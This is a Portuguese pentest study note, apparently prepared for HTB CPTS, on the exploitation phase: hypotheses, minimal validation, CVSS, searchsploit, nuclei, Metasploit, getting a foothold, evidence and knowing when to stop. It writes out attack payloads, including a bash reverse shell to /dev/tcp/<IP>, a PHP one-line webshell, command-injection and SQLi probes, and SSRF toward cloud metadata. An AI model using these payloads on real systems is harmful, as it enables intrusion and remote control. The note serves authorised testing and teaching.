---
tema: Pentest
tópico: Fase 06 — Vulnerabilidade e Exploração
tags: [htb, cpts, fase, exploracao, cvss, nuclei, searchsploit, metasploit, foothold]
dificuldade: medium
---

# 💥 Fase 06 — Vulnerabilidade e Exploração

> [!info] Objetivo da fase
> Converter o mapa da fase anterior em **acesso comprovado, com evidência mínima e risco controlado**. Aqui você formula hipóteses, valida sem quebrar nada e escalona da opção mais segura para a mais complexa. O produto não é "consegui shell" — é **um achado documentado com impacto e caminho de reprodução**.

## 🎯 Quando entrar

- A enumeração (serviços, web, AD) já produziu hipóteses concretas com endpoint/parâmetro/serviço identificado.
- Existe uma versão de software conhecida e uma vulnerabilidade plausível para ela.
- Você tem credenciais válidas e precisa provar o que elas alcançam.
- Quebrou um controle de acesso (bypass de authz, IDOR, JWT) e quer provar impacto.
- **Nunca** entre em exploração por "parecer vulnerável" sem hipótese escrita.

## 📥 Pré-requisitos e inputs

| Input | Observação |
|-------|-----------|
| Lista priorizada de endpoints/parâmetros (Fase 05) | Ponto de partida real |
| Inventário de versões de software | Casa com CVE / `searchsploit` |
| Credenciais ou hashes obtidos | Testar antes de explorar código |
| Escopo do RoE | O que é proibido (DoS, phish, production DB) |
| Janela de manutenção | Para exploits instáveis |
| Listener e IP do atacante | `tun0` / `eth0` — confirme com `ip a` |
| Snapshot/backup do alvo (se possível) | Rede de segurança para testes destrutivos |

## 🪜 Passo a passo

### 1. Escreva a hipótese antes de tocar no alvo

Cada hipótese tem a forma: **"O parâmetro X é concatenado na query Y, então um `'` deve gerar erro de SQL."** Uma frase, falsificável.

```text
Hipóteses pendentes (arquivo hypotheses.md)
- [ ] /search?q= reflete input em HTML sem encode -> XSS
- [ ] /download?file= usa o valor direto no filesystem -> LFI
- [ ] /api/user?id= não valida dono -> IDOR
- [ ] Apache 2.4.49 (do header) -> CVE-2021-41773 path traversal
- [ ] FTP aceita anonymous e há arquivo de config com senha
```

Priorize por: **custo de teste** × **probabilidade** × **impacto estimado**.

### 2. Valide de forma segura — o teste que não destrói

Todo teste deve provar o ponto e **parar**. Nunca use `DROP`, `rm`, nem `--os-shell` antes de saber que é seguro.

| Vulnerabilidade | Teste mínimo (prova) | Teste destrutivo (evitar) |
|-----------------|----------------------|---------------------------|
| SQLi | `'` → erro; `AND 1=1` vs `AND 1=2` | `DROP TABLE` |
| SQLi cega | `SLEEP(5)` e medir tempo | loop infinito de queries |
| XSS | `alert(1)`/`print()` | keylogger persistente |
| LFI | ler `/etc/passwd` | ler base de dados sensível |
| Command Injection | `; id` / `\| whoami` | `rm -rf` |
| SSRF | callback para seu servidor (`nc -lvnp 80`) | varrer rede interna inteira |
| IDOR | trocar id para outro que **você** criou | acessar dados de clientes reais |
| Upload | subir arquivo inócuo que executa `id` | webshell persistente sem autorização |

```bash
# Callback para provar SSRF/RCE cego: ouça o que chega
python3 -m http.server 80

# Prova de SQLi cega por tempo: 2 vs 6 segundos é conclusivo
curl -s -o /dev/null -w "%{time_total}\n" "http://<DOMINIO>/item?id=1"
curl -s -o /dev/null -w "%{time_total}\n" "http://<DOMINIO>/item?id=1'%20AND%20SLEEP(5)--%20-"

# Prova de Command Injection: eco de um valor único e verificação de tempo
curl -s "http://<DOMINIO>/ping?ip=127.0.0.1;id"
```

> [!warning] Regra de ouro
> O teste deve ser o **mínimo que prova**. Se `id` já prova execução de comando, não rode `whoami`, `hostname`, `uname` na sequência só para "ver mais". Uma prova, uma evidência, siga em frente.

### 3. Confirme a reprodutibilidade

Um achado só existe se **reproduz sempre, do zero**. Feche o browser, refaça a requisição crua com `curl`, documente o request completo. Instabilidade hoje vira "não conseguimos reproduzir" no relatório.

```bash
# Salve TODA a requisição: método, path, headers, cookies, corpo
curl -i -X POST http://<DOMINIO>/api/transfer \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<VALOR>' \
  -d '{"from":"<USUARIO>","to":"<USUARIO2>","amount":1}'
```

### 4. Quantifique o impacto — CVSS

CVSS é a linguagem do relatório. Versão 3.1 usa 8 métricas base; o cálculo dá um score 0–10.

| Métrica | Pergunta | Exemplos |
|---------|----------|----------|
| AV (Attack Vector) | De onde ataca? | N(Network) > A(Adjacent) > L(Local) > P(Physical) |
| AC (Attack Complexity) | Precisa de condição especial? | L(Low) > H(High) |
| PR (Privileges Required) | Precisa estar logado? | N(None) > L(Low) > H(High) |
| UI (User Interaction) | Vítima precisa clicar? | N(None) > R(Required) |
| S (Scope) | Afeta outro componente? | U(Unchanged) > C(Changed) |
| C/I/A | Confidencialidade/Integridade/Disponibilidade | N(None) / L(Low) / H(High) |

Exemplo de raciocínio: **SQLi não autenticada, leitura total do banco, sem alterar dados** → `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5 HIGH**. Se o mesmo vetor permitisse escrita, o I vira `H` e vai para **9.8 CRITICAL**.

```bash
# Calculadora oficial (offline não existe; use a web ou o pacote do Metasploit)
searchsploit --cve 2021-41773      # busca por CVE
```

> [!tip] Score sem contexto é ruído
> Um `7.5` num site de marketing interno ≠ `7.5` no sistema de pagamentos. Escreva sempre o **impacto de negócio** ao lado do score: "acesso a dados de 40k clientes", "possibilidade de mover dinheiro".

### 5. Busque o que já é conhecido antes de escrever exploit

Ordem: **searchsploit → nuclei → nmap NSE vuln → Metasploit → exploit manual**.

```bash
# Procura exploits públicos para o software/versão exata
searchsploit apache 2.4.49
searchsploit -m 50383          # copia o exploit para o diretório atual
searchsploit -x 50383          # lê sem copiar

# Nuclei: templates de vulnerabilidade prontos, ótimo para triagem em massa
nuclei -u http://<DOMINIO> -severity critical,high -o nuclei.txt
nuclei -l urls.txt -t http/cves/ -stats

# NSE: scripts vuln do nmap para o serviço identificado
nmap -p 445 --script "smb-vuln-*" <IP>
nmap -p 21 --script "ftp-anon,ftp-vsftpd-backdoor" <IP>
```

### 6. Selecione o exploit pelo risco, não pela empolgação

| Prioridade | Caminho | Por quê | Exemplo |
|-----------|---------|---------|---------|
| 1 | Credencial default/fraca | Zero ruído, zero instabilidade | `admin:admin`, `root:toor` |
| 2 | Misconfiguration | Determinístico, sem exploit | SMB null session, `.git` exposto, `anonymous` FTP |
| 3 | Lógica da aplicação | Não quebra o serviço | IDOR, mass assignment, bypass de authz |
| 4 | CVE com PoC confiável | Reproduzível | CVE com write-up validado |
| 5 | Exploit complexo/instável | Pode derrubar o alvo | Memory corruption com brute de offsets |

Antes de rodar qualquer PoC:

1. **Leia o código.** Exploit público costuma ter payload destrutivo, egress errado ou backdoor embutido.
2. **Ajuste IP/porta.** O `LHOST` do autor nunca é o seu.
3. **Teste contra um alvo local** (container/VM) sempre que o exploit for duvidoso.
4. **Combine a janela.** Exploit instável só em horário aprovado.

```bash
# Metasploit: o fluxo canônico
msfconsole -q
# search <nome/CVE>            -> acha o módulo
# use exploit/linux/http/<mod> -> seleciona
# info                          -> lê opções e alvos (leia SEMPRE)
# show options                  -> o que falta preencher
# set RHOSTS <IP>               -> alvo
# set LHOST tun0                -> seu IP de VPN (confirme com `ip a`)
# set LPORT 4444
# check                         -> muitos módulos suportam check seguro
# run                           -> executa
```

### 7. Obtenha o foothold

Objetivo: **um ponto de execução estável** no alvo. Prefira a forma menos intrusiva disponível.

| Situação | Foothold |
|----------|----------|
| RCE cega / comando com saída | Shell reversa (`bash -i >& /dev/tcp/...`) |
| Upload de arquivo | Webshell (`<?php system($_GET['c']); ?>`) |
| SQLi com privilégio DBA | `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL), UDF (Postgres) |
| Deserialização | Payload de execução de comando |
| Serviço vulnerável (SMB/RDP/HTTP) | Módulo Metasploit com sessão Meterpreter |
| Credencial válida | `evil-winrm`, `ssh`, `psexec`/`wmiexec` |

```bash
# Listener simples no atacante
nc -lvnp 4444

# Reverse shell bash (Linux) — troque <IP> pelo seu tun0
bash -i >& /dev/tcp/<IP>/4444 0>&1

# Alternativa: veja a nota Fase 07 para o catálogo completo e o upgrade de TTY
```

Assim que tiver shell: **estabilize imediatamente** (Fase 07). Shell sem TTY é meia shell.

### 8. Registre a evidência no momento em que ela existe

- Request + response crus (não paráfrase).
- Payload exato usado e o porquê.
- Saída que prova o efeito (arquivo lido, comando executado, dado de outro usuário).
- Timestamp com timezone.
- Estado antes/depois quando o teste alterou algo.

```bash
# Captura padronizada para o relatório
mkdir -p evidencia/<achado> && cd evidencia/<achado>
script -qc "curl -i 'http://<DOMINIO>/x?id=1'" curl-output.txt   # captura tudo
```

### 9. Saiba a hora de parar

Pare quando **um** dos itens for verdadeiro:

- O objetivo do escopo foi provado (ex.: acesso a dado sensível demonstrado).
- O próximo teste é destrutivo e não há autorização explícita.
- O teste sairia da janela acordada.
- Você entrou em produção/dados reais e pode estar violando escopo.
- O risco de indisponibilidade é maior que o valor de provar mais um item.

> [!danger] Pare e comunique
> Se causar indisponibilidade, corromper dado, ou acessar informação fora do escopo: **pare, não tente consertar, e avise o contato de emergência**. Limpe o que criou e registre exatamente o que aconteceu.

## 🧰 Ferramentas

| Ferramenta | O que faz | Quando usar |
|-----------|-----------|-------------|
| `searchsploit` | Banco local de exploits (EDB) | Software/versão com CVE provável |
| `nuclei` | Scanner por templates YAML | Triagem em massa de CVEs/misconfigs |
| `Metasploit` | Framework com módulos e post-exploitation | Exploit encaixa num módulo existente |
| `nmap` NSE vuln | Scripts `*-vuln-*` | Checagem não intrusiva por serviço |
| `Burp Scanner`/`ZAP` | Scan ativo de web | Confirmar XSS/SQLi/LFI de forma guiada |
| `sqlmap` | Automação de SQLi | Depois de já ter confirmado o ponto |
| `hydra`/`nxc` | Brute force/spraying | Credencial fraca suspeita (cuidado com lockout) |
| `curl` | Requisição manual exata | Toda validação e reprodutibilidade |

## 🔀 Árvore de decisão

| Condição | Ação |
|----------|------|
| Versão de software exposta e antiga | `searchsploit` + `nuclei` antes de qualquer coisa |
| Credencial default provável (painel admin em porta alta) | Tente 3–5 combinações; pare se houver lockout |
| Serviço aceita anônimo (FTP/SMB/LDAP) | Leia/configure nada; liste e baixe só o necessário |
| Parâmetro reflete no HTML | Teste XSS com prova mínima |
| Erro de banco exposto | SQLi manual (`'`, `ORDER BY`, `UNION`) antes de `sqlmap` |
| Parâmetro é caminho de arquivo | LFI: `/etc/passwd`, `..\..\win.ini`, wrappers PHP |
| Parâmetro é URL | SSRF: callback `nc -lvnp 80`; se alcançar metadata (169.254.169.254) é CRITICAL |
| Instância cloud (AWS/GCP/Azure) | SSRF/metadata → roubo de token de role |
| Upload sem validação de tipo | Webshell; confirme por execução de `id` |
| Só RCE cega (sem saída) | Shell reversa ou exfiltração por DNS/HTTP |
| Exploit público exige interação do usuário | Avalie UI=Required; só se RoE permitir |
| Exploit derruba serviço | Confirme autorização e janela antes; prefira alternativa |
| Sem caminho técnico aparente | Dobre a enumeração (Fase 04/05); cancele hipótese e siga |
| Achado confirmado e objetivo provado | **Pare**, documente e vá para Fase 07/10 |

## 📤 Evidências a registrar

- Hipótese testada + resultado (confirmada/refutada) — inclua as refutadas.
- Request/response crus e o comando exato usado.
- Payload/exploit com origem (EDB ID, CVE, commit) e link da fonte.
- CVSS 3.1 com o vetor textual e a justificativa de cada métrica.
- Impacto de negócio em uma frase.
- Timestamp + host + usuário usado.
- Artefatos criados no alvo (webshell, arquivo, conta) → **para limpeza**.
- Acesso obtido: usuário, nível, host, como reproduzir.

## 🕳️ Pegadinhas

> [!warning] Erros clássicos de exploração
> - Rodar exploit público sem ler o código — payload destrutivo, backdoor ou egress errado.
> - Esquecer `ip a`: `LHOST` no `eth0` quando o alvo só alcança `tun0` (ou vice-versa).
> - Rodar scan ativo de web (Burp Scanner/ZAP) em produção em horário comercial.
> - Usar `sqlmap` antes de entender o ponto: gera dezenas de requisições e às vezes escreve no banco.
> - Testar brute force sem checar política de lockout → conta do cliente bloqueada.
> - Provocar erro de aplicação em endpoint compartilhado e apresentar isso como "achado".
> - Confundir sintoma de firewall/WAF (403 genérico) com vulnerabilidade.
> - Reportar navegação por `robots.txt` como descoberta — prova, não achado.
> - Escrever "acesso a dados sensíveis" sem ter lido **um** registro como prova.
> - Não limpar a webshell/arquivo/conta criados ao finalizar.
> - Exploit instável fora da janela acordada: ganha shell e perde o serviço do cliente.

## ✅ Checklist

- [ ] Hipóteses escritas e priorizadas (custo × probabilidade × impacto)
- [ ] Cada validação usou o payload mínimo que prova
- [ ] Reprodutibilidade confirmada com `curl` do zero
- [ ] CVSS 3.1 calculado com justificativa por métrica
- [ ] Impacto de negócio escrito em linguagem de cliente
- [ ] `searchsploit`/`nuclei`/NSE rodados para o software identificado
- [ ] Exploit escolhido pelo menor risco que alcança o objetivo
- [ ] Código do exploit revisado antes de executar
- [ ] `RHOSTS`/`LHOST`/`LPORT` conferidos
- [ ] `check` executado quando o módulo suporta
- [ ] Foothold obtido e estável
- [ ] Evidência crua salva e timestampada
- [ ] Artefatos no alvo anotados para limpeza
- [ ] Critério de parada respeitado

## 🔗 Relacionado

- [[Fase 07 - Shells e Transferência de Arquivos]]
- [[Fase 05 - Enumeração Web]]
- [[CPTS 06 - Vulnerability Assessment]]
- [[CPTS 09 - Using the Metasploit Framework]]
- [[CPTS 24 - Attacking Common Applications]]
